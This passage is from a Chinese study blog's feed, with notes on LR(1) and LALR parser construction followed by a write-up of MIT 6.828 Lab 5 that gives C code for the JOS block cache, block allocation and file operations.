S,使得仅当S归约到S’时到达接受状态.(原开始符号可能有多个产生式,也就有多种归约能到达接受状态)</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271423144.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271430616.png"></p><p>解释一下闭包函数的作用:<br>    对于项目E’ -&gt; ·E,指示了语法分析器此刻期望从输入中得到E(回忆一下,项目指示了对某产生式的识别状态),当然,如果存在产生式E-&gt;T,分析器同样可能期望得到一个T.为了节约存储空间,我们使用closure来计算出分析器在某状态时的项目集合,指示当前状态所有可能期望得到的串.<br>    <img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271431598.png"><br>这里再引入两个概念,核心项目和非核心项目.非核心项目可以通过对核心项目求闭包来重新生成.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271438905.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271453632.png"><br>GOTO(I,X)就是在状态I识别到文法符号X后到达的新状态.<br>看这样一个例子:<br>在状态I识别到符号+,状态I的项目(后文在说状态的项目时默认是求闭包后的结果)中期待得到符号+的项目只有E-&gt;E· +T,识别+后称为E-&gt;E+ · T,则新状态应该是项目E-&gt;E+ · T的闭包.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271512338.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271515732.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271541992.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271541791.png"></p><p>LR(0)语法分析器的识别过程.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271537409.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271535052.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271539985.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271540363.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271540956.png"></p><p>活前缀的有效项目,我的理解,有效项目指示当前栈中活前缀在遇到下一个文法符号β时的动作,若β为ε,则归约,否则移进.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271620179.png"></p><h6 id="规范LR-1"><a href="#规范LR-1" class="headerlink" title="规范LR(1)"></a>规范LR(1)</h6><p>SLR语法分析依靠活前缀的有效项目进行归约或移进操作的指示,然而对于一些文法,可能有一个活前缀的多个有效项目指示分析器做不同的操作,产生移进-归约冲突.看下面这样一个例子:</p><p>对于如下文法:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311707582.png"><br>构造其LR(0)标准集,其中一个状态是这样的.该状态对于活前缀L且即将识别符号=时,有两个有效的项目分别指示移进和归约.语法分析器不能决定.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311707718.png"><br>然而该冲突其实并不存在,因为文法中不存在以R=开始的右句型(=不在FOLLOW(R)中),所以应该选择移进操作.由此可见,如果让状态蕴含更多的信息,可以解决这样的冲突.</p><p>回顾一下在自顶向下分析中,我们解决推导冲突的办法: 提取左因子,合并状态,也可以说成减少状态蕴藏的信息,得到唯一的状态转换.<br>在这里正好逆一下,分裂状态,使状态蕴含更多的信息,得到唯一的状态转换.</p><blockquote><p>同样是消除冲突,为什么会有相反的两种思想?</p><blockquote><p>本质上是相同的,减少目标状态信息,增加当前状态信息.解决推导冲突所需要的信息,在多个输入符号之后,所以我们暂时减少目标状态的信息以推迟决定,直到当前状态搜集到足够多能做出决定的信息.而解决(类似示例中的)归约冲突所需要的信息,存在于文法本身,若文法设计本身不存在这样的归约冲突,语法分析器便可根据文法本身解决问题,所以要做的就是从文法中产生这样的信息并保存到状态中.</p></blockquote></blockquote><p>规范LR(1)语法分析的项目:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311744785.png"></p><p>还记得我们说SLR语法分析依靠活前缀的有效项目进行归约或移进操作的指示吗?规范LR(1)可以理解为提高了有效项目的要求.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311745101.png"></p><p>规范LR(1)项目集的构造<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311749511.png"></p><p>规范LR(1)分析表的构造<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311752329.png"></p><h6 id="LALR"><a href="#LALR" class="headerlink" title="LALR"></a>LALR</h6><p>为了减少规范LR语法分析表的大小,使用一种LALR的分析方法.</p><p>来看这样一个文法和对应的规范LR的GOTO图.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311805400.png"></p><p>状态I4和I7都只有一个项目<br>对于状态I4,当下个文法符号是c或d时,根据项目的第一分量(产生式)进行归约,对于状态I7,当下个文法符号是$时同样根据项目第一分量进行归约,而这两个第一分量(core)相同.所以我们可以合并这两个状态,而不破坏原本对分析器的指示.<br>(这样的合并可能会延后错误的发现,但不会遗漏).<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310312058793.png"></p><p>来分析一下这样合并的有效性:</p><blockquote><p>是否会引进移进-归约冲突?</p><blockquote><p>不会.进行合并的状态的项目一定有相同的core,对一个core而言,是如何决定进行移进还是归约的?根据·是否到了产生式的结尾.也就是只和core有关而与第二分量无关.有的人可能会说,归约的条件还有一个下一文法符号符合第二分量,但在限定了对一个core而言,这其实是决定归约或报告错误,与移进无关.若合并后存在移进-归约冲突,说明该冲突本身就存在于规范LR(1)分析中,该文法不是LR(1)文法.</p></blockquote><p>是否会引进归约-归约冲突?</p><blockquote><p>可能会.在规范LR(1)中,如何决定进行归约的产生式?由第二分量决定.对于这样两个即将被我们合并的状态,各自在识别下一个符号e和d的时候能够根据第二分量选择正确的产生式,而在合并之后,第二分量相同,无法决定,产生归约-归约冲突.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311904951.png"></p></blockquote></blockquote><p>简易但耗空间的LALR表的构造.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311915957.png"></p><p>更efficient的构造方式,还是利用分析过程中通过对核心项目的计算来减小分析表的大小.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310312119100.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311031547552.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311031548493.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311031548887.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 编译原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Syntax-Analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.828 Lab5</title>
      <link href="/2023/6.828-Lab5/"/>
      <url>/2023/6.828-Lab5/</url>
      
        <content type="html"><![CDATA[<p>最崩溃的一集…Lab倒是很简单,只是文件系统一启用,之前代码的好多问题都显现出来了,然后就是debugggg.</p><h2 id="Lab-5-File-system-Spawn-and-Shell"><a href="#Lab-5-File-system-Spawn-and-Shell" class="headerlink" title="Lab 5: File system, Spawn and Shell"></a>Lab 5: File system, Spawn and Shell</h2><h3 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h3><p>切换分支之后编译有点问题,改一改:</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310241258348.png"><br>在GNUmakefile中加上-Wno-address-of-packed-member</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310241423170.png"></p><p>将fs.h中定义的全局变量改为外部变量,并在fs.c中定义.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">Super</span> *<span class="title">super</span>;</span><span class="comment">// superblock</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">uint32_t</span> *bitmap;<span class="comment">// bitmap blocks mapped in memory</span></span><br></pre></td></tr></tbody></table></figure><p>改下输出,lab4满分通过.</p><h3 id="File-system-preliminaries"><a href="#File-system-preliminaries" class="headerlink" title="File system preliminaries"></a>File system preliminaries</h3><p>文件系统的设计就不在这里说了,详见《HQOS 设计与实现》.</p><span id="more"></span><h3 id="The-File-System"><a href="#The-File-System" class="headerlink" title="The File System"></a>The File System</h3><h4 id="The-Block-Cache"><a href="#The-Block-Cache" class="headerlink" title="The Block Cache"></a>The Block Cache</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Fault any disk block that is read in to memory by</span></span><br><span class="line"><span class="comment">// loading it from disk.</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">bc_pgfault</span><span class="params">(<span class="keyword">struct</span> UTrapframe *utf)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">void</span> *addr = (<span class="type">void</span> *) utf-&gt;utf_fault_va;</span><br><span class="line"><span class="type">uint32_t</span> blockno = ((<span class="type">uint32_t</span>)addr - DISKMAP) / BLKSIZE;</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check that the fault was within the block cache region</span></span><br><span class="line"><span class="keyword">if</span> (addr &lt; (<span class="type">void</span>*)DISKMAP || addr &gt;= (<span class="type">void</span>*)(DISKMAP + DISKSIZE))</span><br><span class="line">panic(<span class="string">"page fault in FS: eip %08x, va %08x, err %04x"</span>,</span><br><span class="line">      utf-&gt;utf_eip, addr, utf-&gt;utf_err);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanity check the block number.</span></span><br><span class="line"><span class="keyword">if</span> (super &amp;&amp; blockno &gt;= super-&gt;s_nblocks)</span><br><span class="line">panic(<span class="string">"reading non-existent block %08x\n"</span>, blockno);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate a page in the disk map region, read the contents</span></span><br><span class="line"><span class="comment">// of the block from the disk into that page.</span></span><br><span class="line"><span class="comment">// Hint: first round addr to page boundary. fs/ide.c has code to read</span></span><br><span class="line"><span class="comment">// the disk.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// LAB 5: you code here:</span></span><br><span class="line">addr = ROUNDDOWN(addr,PGSIZE);</span><br><span class="line"><span class="keyword">if</span>((r = sys_page_alloc(<span class="number">0</span>,addr,PTE_SYSCALL)))</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"in bc_pgfault, sys_page_alloc: %e"</span>,r);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((r = ide_read(blockno*BLKSECTS,addr,BLKSECTS)))</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"in bc_pgfault, ide_read"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="comment">// Clear the dirty bit for the disk block page since we just read the</span></span><br><span class="line"><span class="comment">// block from disk</span></span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_map(<span class="number">0</span>, addr, <span class="number">0</span>, addr, uvpt[PGNUM(addr)] &amp; PTE_SYSCALL)) &lt; <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">"in bc_pgfault, sys_page_map: %e"</span>, r);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check that the block we read was allocated. (exercise for</span></span><br><span class="line"><span class="comment">// the reader: why do we do this *after* reading the block</span></span><br><span class="line"><span class="comment">// in?)</span></span><br><span class="line"><span class="keyword">if</span> (bitmap &amp;&amp; block_is_free(blockno))</span><br><span class="line">panic(<span class="string">"reading free block %08x\n"</span>, blockno);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Flush the contents of the block containing VA out to disk if</span></span><br><span class="line"><span class="comment">// necessary, then clear the PTE_D bit using sys_page_map.</span></span><br><span class="line"><span class="comment">// If the block is not in the block cache or is not dirty, does</span></span><br><span class="line"><span class="comment">// nothing.</span></span><br><span class="line"><span class="comment">// Hint: Use va_is_mapped, va_is_dirty, and ide_write.</span></span><br><span class="line"><span class="comment">// Hint: Use the PTE_SYSCALL constant when calling sys_page_map.</span></span><br><span class="line"><span class="comment">// Hint: Don't forget to round addr down.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">flush_block</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">uint32_t</span> blockno = ((<span class="type">uint32_t</span>)addr - DISKMAP) / BLKSIZE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (addr &lt; (<span class="type">void</span>*)DISKMAP || addr &gt;= (<span class="type">void</span>*)(DISKMAP + DISKSIZE))</span><br><span class="line">panic(<span class="string">"flush_block of bad va %08x"</span>, addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line">addr = ROUNDDOWN(addr,PGSIZE);</span><br><span class="line"><span class="keyword">if</span>(va_is_mapped(addr)&amp;&amp;va_is_dirty(addr))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(ide_write(blockno*BLKSECTS,addr,BLKSECTS))</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"in flush_block, ide_write"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((r = sys_page_map(<span class="number">0</span>,addr,<span class="number">0</span>,addr,uvpt[PGNUM(addr)] &amp; PTE_SYSCALL)))</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"in flush_block, sys_page_map: %e"</span>,r);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h4 id="The-Block-Bitmap"><a href="#The-Block-Bitmap" class="headerlink" title="The Block Bitmap"></a>The Block Bitmap</h4><p>更改bitmap之后记得刷新bitmap对应块缓存.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">alloc_block</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// The bitmap consists of one or more blocks.  A single bitmap block</span></span><br><span class="line"><span class="comment">// contains the in-use bits for BLKBITSIZE blocks.  There are</span></span><br><span class="line"><span class="comment">// super-&gt;s_nblocks blocks in the disk altogether.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;super-&gt;s_nblocks;++i)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(block_is_free(i))</span><br><span class="line">{</span><br><span class="line">bitmap[i/<span class="number">32</span>] &amp;= ~(<span class="number">1</span>&lt;&lt;(i%<span class="number">32</span>));</span><br><span class="line">flush_block((<span class="type">void</span>*)bitmap+BLKSIZE*(i/BLKBITSIZE));</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> -E_NO_DISK;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="File-Operations"><a href="#File-Operations" class="headerlink" title="File Operations"></a>File Operations</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Find the disk block number slot for the 'filebno'th block in file 'f'.</span></span><br><span class="line"><span class="comment">// Set '*ppdiskbno' to point to that slot.</span></span><br><span class="line"><span class="comment">// The slot will be one of the f-&gt;f_direct[] entries,</span></span><br><span class="line"><span class="comment">// or an entry in the indirect block.</span></span><br><span class="line"><span class="comment">// When 'alloc' is set, this function will allocate an indirect block</span></span><br><span class="line"><span class="comment">// if necessary.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns:</span></span><br><span class="line"><span class="comment">//0 on success (but note that *ppdiskbno might equal 0).</span></span><br><span class="line"><span class="comment">//-E_NOT_FOUND if the function needed to allocate an indirect block, but</span></span><br><span class="line"><span class="comment">//alloc was 0.</span></span><br><span class="line"><span class="comment">//-E_NO_DISK if there's no space on the disk for an indirect block.</span></span><br><span class="line"><span class="comment">//-E_INVAL if filebno is out of range (it's &gt;= NDIRECT + NINDIRECT).</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Analogy: This is like pgdir_walk for files.</span></span><br><span class="line"><span class="comment">// Hint: Don't forget to clear any block you allocate.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">file_block_walk</span><span class="params">(<span class="keyword">struct</span> File *f, <span class="type">uint32_t</span> filebno, <span class="type">uint32_t</span> **ppdiskbno, <span class="type">bool</span> alloc)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"><span class="keyword">if</span>(filebno &gt;= NDIRECT+NINDIRECT)</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line"><span class="keyword">if</span>(filebno&lt;NDIRECT)</span><br><span class="line">{</span><br><span class="line">*ppdiskbno = &amp;(f-&gt;f_direct[filebno]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(f-&gt;f_indirect==<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(alloc)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>((r = alloc_block())&lt;<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line"><span class="built_in">memset</span>(diskaddr(r), <span class="number">0</span>, BLKSIZE);</span><br><span class="line">f-&gt;f_indirect = r;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> -E_NOT_FOUND;</span><br><span class="line">}</span><br><span class="line">*ppdiskbno = &amp;(((<span class="type">uint32_t</span>*)(diskaddr(f-&gt;f_indirect)))[filebno-NDIRECT]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set *blk to the address in memory where the filebno'th</span></span><br><span class="line"><span class="comment">// block of file 'f' would be mapped.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//-E_NO_DISK if a block needed to be allocated but the disk is full.</span></span><br><span class="line"><span class="comment">//-E_INVAL if filebno is out of range.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: Use file_block_walk and alloc_block.</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">file_get_block</span><span class="params">(<span class="keyword">struct</span> File *f, <span class="type">uint32_t</span> filebno, <span class="type">char</span> **blk)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="type">uint32_t</span>* ppdisk;</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"><span class="keyword">if</span>((r = file_block_walk(f,filebno,&amp;ppdisk,<span class="number">1</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(*ppdisk==<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>((r = alloc_block())&lt;<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line">*ppdisk = r;</span><br><span class="line"><span class="built_in">memset</span>(diskaddr(r), <span class="number">0</span>, BLKSIZE);</span><br><span class="line">}</span><br><span class="line">*blk = diskaddr(*ppdisk);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="The-file-system-interface"><a href="#The-file-system-interface" class="headerlink" title="The file system interface"></a>The file system interface</h4><h5 id="用户文件读写流程分析"><a href="#用户文件读写流程分析" class="headerlink" title="用户文件读写流程分析"></a>用户文件读写流程分析</h5><h6 id="open"><a href="#open" class="headerlink" title="open"></a>open</h6><p>用户进程使用lib中的open函数,指定文件路径和以何种模式打开.open函数为进程分配一个未使用的文件描述符号fd,对应着0xD0000000处MAXFD个struct Fd结构中的一个.然后通过IPC进程间通信向fs server进程发送FSREQ_OPEN的请求.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">int</span> mode)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Fd</span> *<span class="title">fd</span>;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(path) &gt;= MAXPATHLEN)</span><br><span class="line"><span class="keyword">return</span> -E_BAD_PATH;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((r = fd_alloc(&amp;fd)) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(fsipcbuf.open.req_path, path);</span><br><span class="line"></span><br><span class="line">fsipcbuf.open.req_omode = mode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((r = fsipc(FSREQ_OPEN, fd)) &lt; <span class="number">0</span>) {</span><br><span class="line">fd_close(fd, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> fd2num(fd);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>server进程接收到open请求,根据模式尝试打开(创建)文件:先调用openfile_alloc函数在opentab中分配一个struct OpenFile结构o,包括为o-&gt;fd分配物理页.然后调用file_open,从根目录开始遍历直到找到用户请求文件的struct File结构(JOS实现中目录的内容即是目录中的文件的struct File结构),设置o-&gt;file指向该结构.通过IPC通信的交互,最终实现将为o-&gt;fd分配的物理页映射到用户进程中该fd结构的对应虚拟地址.</p><p>这里理解一下openfile_alloc函数中的case1.当该opentab条目的o_fd还未使用过,分配一个物理页,此时pageref为1,再映射到用户,pageref为2,下一次打开文件就应该跳过这个条目.若pageref为1时,意味着除了fs server本身,已经没有用户进程使用该文件,所以该条目依然为free状态,可以分配.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Allocate an open file.</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">openfile_alloc</span><span class="params">(<span class="keyword">struct</span> OpenFile **o)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> i, r;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Find an available open-file table entry</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXOPEN; i++) {</span><br><span class="line"><span class="keyword">switch</span> (pageref(opentab[i].o_fd)) {</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_alloc(<span class="number">0</span>, opentab[i].o_fd, PTE_P|PTE_U|PTE_W)) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line"><span class="comment">/* fall through */</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">opentab[i].o_fileid += MAXOPEN;</span><br><span class="line">*o = &amp;opentab[i];</span><br><span class="line"><span class="built_in">memset</span>(opentab[i].o_fd, <span class="number">0</span>, PGSIZE);</span><br><span class="line"><span class="keyword">return</span> (*o)-&gt;o_fileid;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> -E_MAX_OPEN;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>既然未来的读写操作都是server完成的,把o-&gt;fd映射到用户进程有什么用呢?从代码上能看出来的用途大概是1)对某文件打开模式的检查 2)将对特定文件类型(devid)的IO操作dispatch到特定的函数实现,如devfile,pipe,console.</p><p>(<del>这Fd映射还是以可写权限映射的,没道理</del>)</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 